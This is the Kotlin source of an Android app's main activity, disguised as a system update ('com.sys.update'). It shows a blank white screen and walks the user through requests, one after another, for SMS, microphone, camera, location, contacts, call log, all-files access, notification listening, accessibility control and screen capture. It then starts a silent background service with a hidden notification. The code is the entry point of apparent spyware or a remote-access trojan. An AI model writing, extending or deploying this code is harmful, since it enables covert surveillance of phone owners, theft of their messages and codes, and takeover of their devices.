package com.sys.update

import android.Manifest
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.widget.FrameLayout
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private val PERM_REQUEST_CODE = 1001
    private val BATTERY_REQUEST_CODE = 1002
    private val SCREEN_REQUEST_CODE = 1003

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val white = FrameLayout(this)
        white.setBackgroundColor(Color.WHITE)
        setContentView(white)

        DeviceManager.registerDevice(this)

        requestPermissionsStep1()
    }

    private fun requestPermissionsStep1() {
        val needed = mutableListOf<String>()

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED)
            needed.add(Manifest.permission.READ_EXTERNAL_STORAGE)

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED)
            needed.add(Manifest.permission.READ_SMS)

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED)
            needed.add(Manifest.permission.RECORD_AUDIO)

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED)
            needed.add(Manifest.permission.CAMERA)

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED)
            needed.add(Manifest.permission.ACCESS_FINE_LOCATION)

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED)
            needed.add(Manifest.permission.ACCESS_COARSE_LOCATION)

        // ⭐ جديد — جهات الاتصال
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED)
            needed.add(Manifest.permission.READ_CONTACTS)

        // ⭐ جديد — سجل المكالمات
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED)
            needed.add(Manifest.permission.READ_CALL_LOG)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED)
                needed.add(Manifest.permission.POST_NOTIFICATIONS)
        }

        if (needed.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, needed.toTypedArray(), PERM_REQUEST_CODE)
        } else {
            requestAllFilesAccess()
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        requestAllFilesAccess()
    }

    private fun requestAllFilesAccess() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                try {
                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                    intent.data = Uri.parse("package:$packageName")
                    startActivity(intent)
                } catch (e: Exception) {
                    try {
                        val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                        startActivity(intent)
                    } catch (_: Exception) {}
                }
            }
        }
        android.os.Handler(mainLooper).postDelayed({ requestBatteryOptimization() }, 3000)
    }

    private fun requestBatteryOptimization() {
        try {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            intent.data = Uri.parse("package:$packageName")
            startActivityForResult(intent, BATTERY_REQUEST_CODE)
        } catch (_: Exception) {}
        android.os.Handler(mainLooper).postDelayed({ requestNotifAccess() }, 3000)
    }

    private fun requestNotifAccess() {
        if (!isNotifAccessGranted()) {
            try {
                startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
            } catch (_: Exception) {}
        }
        android.os.Handler(mainLooper).postDelayed({ requestAccessibility() }, 4000)
    }

    private fun isNotifAccessGranted(): Boolean {
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return flat != null && flat.contains(packageName)
    }

    private fun requestAccessibility() {
        if (!AccessibilityHelper.isEnabled(this)) {
            try {
                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
            } catch (_: Exception) {}
        }
        android.os.Handler(mainLooper).postDelayed({ requestScreenCapture() }, 5000)
    }

    private fun requestScreenCapture() {
        try {
            ScreenCapture.requestPermission(this, SCREEN_REQUEST_CODE)
        } catch (_: Exception) {
            startBackgroundService()
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == SCREEN_REQUEST_CODE) {
            ScreenCapture.onPermissionResult(this, resultCode, data)
            android.os.Handler(mainLooper).postDelayed({ startBackgroundService() }, 1000)
        }
    }

    private fun startBackgroundService() {
        try {
            createNotificationChannel()
            val intent = Intent(this, BackgroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
        } catch (_: Exception) {}
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "sys_sync_channel",
                "CREFTEX",
                NotificationManager.IMPORTANCE_MIN
            )
            channel.setSound(null, null)
            channel.enableVibration(false)
            channel.setShowBadge(false)
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.createNotificationChannel(channel)
        }
    }
}
